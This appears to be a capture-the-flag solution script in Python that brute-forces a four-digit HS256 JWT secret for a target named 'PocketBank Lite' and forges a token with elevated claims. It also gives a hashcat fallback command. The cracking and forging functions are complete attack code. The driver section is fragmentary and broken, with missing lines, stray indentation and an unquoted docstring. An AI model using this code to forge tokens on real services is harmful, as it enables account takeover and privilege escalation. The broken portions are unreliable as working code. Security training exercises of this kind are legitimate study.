crack_jwt.py — brute-force the PocketBank Lite HS256 JWT secret and
forge a new token with elevated claims.

Hint: "4 digits holding the door shut, and them small enough to enumerate."
Assumption: HS256 secret is a 4-digit numeric string (0000-9999).

import base64
import hashlib
import hmac
import json
import sys

# --- captured token ---------------------------------------------------------
TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJhY2NvdW50IjoiY3VzdG9tZXIiLCJyb2xlIjoiY3VzdG9tZXIiLCJpYXQiOjE3OTQzMDM2NDF9"
    ".aEGiBoWqJC7JMSV6eM-L98d3-7m4V7ZQZNbtvTyASoA"
)

# --- helpers ----------------------------------------------------------------
def b64url_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def b64url_json(obj) -> str:
    return b64url_enc(json.dumps(obj, separators=(",", ":")).encode())

# --- 1. crack the secret ----------------------------------------------------
def crack(token: str) -> str:
    header, payload, sig_b64 = token.split(".")
    signing_input = f"{header}.{payload}".encode()
    target = b64url_dec(sig_b64)

    # 10,000 candidates, ~1 second in Python.  Two paddings so "42",
    # "0042", and "42" (i.e. zero-padded or not) are both tried.
    for i in range(10_000):
        for s in (f"{i:04d}", str(i)):
            secret = s.encode()
            if hmac.compare_digest(
                hmac.new(secret, signing_input, hashlib.sha256).digest(), target
            ):
                return s
    return None

# --- 2. forge a new token ---------------------------------------------------
def forge(secret: str, claims: dict) -> str:
    header = b64url_json({"alg": "HS256", "typ": "JWT"})
    payload = b64url_json(claims)
    signing_input = f"{header}.{payload}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url_enc(sig)}"

# --- driver -----------------------------------------------------------------

    print("[*] Original header :", json.loads(b64url_dec(h)))

    print("[*] Cracking HS256 secret over 0000-9999 ...")

        print("    Fallback: hashcat -m 16500 /tmp/jwt.txt rockyou.txt")
